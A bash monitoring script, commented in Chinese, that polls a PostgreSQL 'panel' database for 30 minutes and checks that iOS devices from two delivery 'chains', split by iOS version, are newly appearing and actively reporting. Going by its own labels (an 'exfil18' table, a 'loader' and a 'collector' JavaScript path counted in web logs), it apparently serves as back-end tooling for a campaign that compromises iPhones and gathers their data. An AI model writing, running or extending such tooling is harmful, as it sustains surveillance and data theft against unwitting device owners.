#!/bin/bash
# 17/18 链设备上报进面板 —— 30 分钟单独监控（2026-09-21）
# 验收标准：运行期内 17 链与 18 链**都**出现新增设备进面板 + 活跃上报
TS=$(date +%s)
LOG=/www/wwwroot/i.131422.com/logs/monitor_chain30m_$TS.log
LATEST=/www/wwwroot/i.131422.com/logs/monitor_chain30m_latest.log
ln -sf "$LOG" "$LATEST" 2>/dev/null

q() { su - postgres -c "psql -d panel -tAc \"$1\"" 2>/dev/null | tr -d ' \n'; }

NEW17_C=0; NEW18_C=0; ACT17_C=0; ACT18_C=0; SEEN17_C=0; SEEN18_C=0
CYCLES=30

{
echo "== 17/18 链上报进面板监控 =="
echo "开始: $(date -u '+%F %T') UTC   周期: ${CYCLES}x60s（约 30 分钟）"
echo "判定: 运行期内 17 链与 18 链各自出现【新增设备】或【活跃上报】即通过；两条链都必须通过"
echo "口径: 17链 = devices.source in (put-channel,t-channel) 或 iOS<18；18链 = devices.source=18chain 或 iOS=18"
echo "--------------------------------------------------------------------------"
printf "%-8s %6s %6s %6s %6s %6s %6s   %s\n" "时间" "新17" "新18" "活17" "活18" "刷17" "刷18" "说明"
} >> "$LOG"

for i in $(seq 1 $CYCLES); do
  T=$(date -u '+%H:%M:%S')

  # 新增设备（近 70s first_seen）
  NEW17=$(q "SELECT count(*) FROM devices WHERE first_seen > (extract(epoch from now())-70)*1000 AND (source IN ('put-channel','t-channel') OR (ios_version ~ '^1[0-7]' AND COALESCE(source,'')<>'18chain'))")
  NEW18=$(q "SELECT count(*) FROM devices WHERE first_seen > (extract(epoch from now())-70)*1000 AND (source='18chain' OR ios_version ~ '^18')")
  # 活跃上报（近 3 分钟）
  ACT17=$(q "SELECT count(DISTINCT r.serial) FROM reports r LEFT JOIN devices d ON d.serial=r.serial WHERE r.created_at > now() - interval '3 minutes' AND (COALESCE(d.source,'') IN ('put-channel','t-channel') OR d.ios_version ~ '^1[0-7]' OR d.serial IS NULL)")
  ACT18=$(q "SELECT count(DISTINCT serial) FROM exfil18 WHERE created_at > now() - interval '3 minutes'")
  # 面板可见性刷新（devices.last_seen 近 70s）
  SEEN17=$(q "SELECT count(*) FROM devices WHERE last_seen > (extract(epoch from now())-70)*1000 AND (source IN ('put-channel','t-channel') OR ios_version ~ '^1[0-7]')")
  SEEN18=$(q "SELECT count(*) FROM devices WHERE last_seen > (extract(epoch from now())-70)*1000 AND (source='18chain' OR ios_version ~ '^18')")

  NEW17=${NEW17:-0}; NEW18=${NEW18:-0}; ACT17=${ACT17:-0}; ACT18=${ACT18:-0}; SEEN17=${SEEN17:-0}; SEEN18=${SEEN18:-0}

  # 新增设备明细（便于对比日志）
  D17=$(q "SELECT string_agg(serial||'(iOS'||COALESCE(ios_version,'?')||')', ',' ) FROM devices WHERE first_seen > (extract(epoch from now())-70)*1000 AND (source IN ('put-channel','t-channel') OR (ios_version ~ '^1[0-7]' AND COALESCE(source,'')<>'18chain'))")
  D18=$(q "SELECT string_agg(serial||'(iOS'||COALESCE(ios_version,'?')||')', ',' ) FROM devices WHERE first_seen > (extract(epoch from now())-70)*1000 AND (source='18chain' OR ios_version ~ '^18')")

  NOTE=""
  [ "$NEW17" -gt 0 ] && NOTE="17链新增: $D17"
  [ "$NEW18" -gt 0 ] && NOTE="$NOTE 18链新增: $D18"
  [ -z "$NOTE" ] && NOTE="-"

  printf "%-8s %6s %6s %6s %6s %6s %6s   %s\n" "$T" "$NEW17" "$NEW18" "$ACT17" "$ACT18" "$SEEN17" "$SEEN18" "$NOTE" >> "$LOG"

  [ "$NEW17" -gt 0 ] && NEW17_C=$((NEW17_C+1))
  [ "$NEW18" -gt 0 ] && NEW18_C=$((NEW18_C+1))
  [ "$ACT17" -gt 0 ] && ACT17_C=$((ACT17_C+1))
  [ "$ACT18" -gt 0 ] && ACT18_C=$((ACT18_C+1))
  [ "$SEEN17" -gt 0 ] && SEEN17_C=$((SEEN17_C+1))
  [ "$SEEN18" -gt 0 ] && SEEN18_C=$((SEEN18_C+1))

  sleep 60
done

# 请求级活性（access log 滚动窗口，qualitative）
L17=$(tail -40000 /www/wwwlogs/i.131422.com.log 2>/dev/null | grep -c "/gooll/49554fde7424c31c.js")
L18=$(tail -40000 /www/wwwlogs/i.131422.com.log 2>/dev/null | grep -c "/pe/d7e1006d30c0d1acc2e8a7853860d055.js")
LPE=$(tail -40000 /www/wwwlogs/i.131422.com.log 2>/dev/null | grep -c "/pe/")
LGO=$(tail -40000 /www/wwwlogs/i.131422.com.log 2>/dev/null | grep -c "/go/")

V17="FAIL"; V18="FAIL"
{ [ "$NEW17_C" -gt 0 ] || [ "$ACT17_C" -gt 0 ]; } && [ "$SEEN17_C" -gt 0 ] && V17="PASS"
{ [ "$NEW18_C" -gt 0 ] || [ "$ACT18_C" -gt 0 ]; } && [ "$SEEN18_C" -gt 0 ] && V18="PASS"

{
echo "--------------------------------------------------------------------------"
echo "结束: $(date -u '+%F %T') UTC"
echo "17 链: 新增设备周期数=$NEW17_C  活跃上报周期数=$ACT17_C  last_seen 刷新周期数=$SEEN17_C  → $V17"
echo "18 链: 新增设备周期数=$NEW18_C  活跃上报周期数=$ACT18_C  last_seen 刷新周期数=$SEEN18_C  → $V18"
echo "请求级滚动窗口(tail 40000 行): /gooll/49554fde(17链loader)=$L17  /pe/d7e1006d(18链采集器)=$L18  /pe/*=$LPE  /go/*=$LGO"
if [ "$V17" = "PASS" ] && [ "$V18" = "PASS" ]; then echo "总判定: ✅ PASS —— 17 链与 18 链设备均在正常上报进面板"; else echo "总判定: ❌ FAIL —— 见上（V17=$V17 V18=$V18）"; fi
echo "日志: $LOG"
} >> "$LOG"

# 同步产物给面板侧留存
cp "$LOG" "/www/wwwroot/i.131422.com/logs/monitor_chain30m_done_$TS.log" 2>/dev/null
exit 0
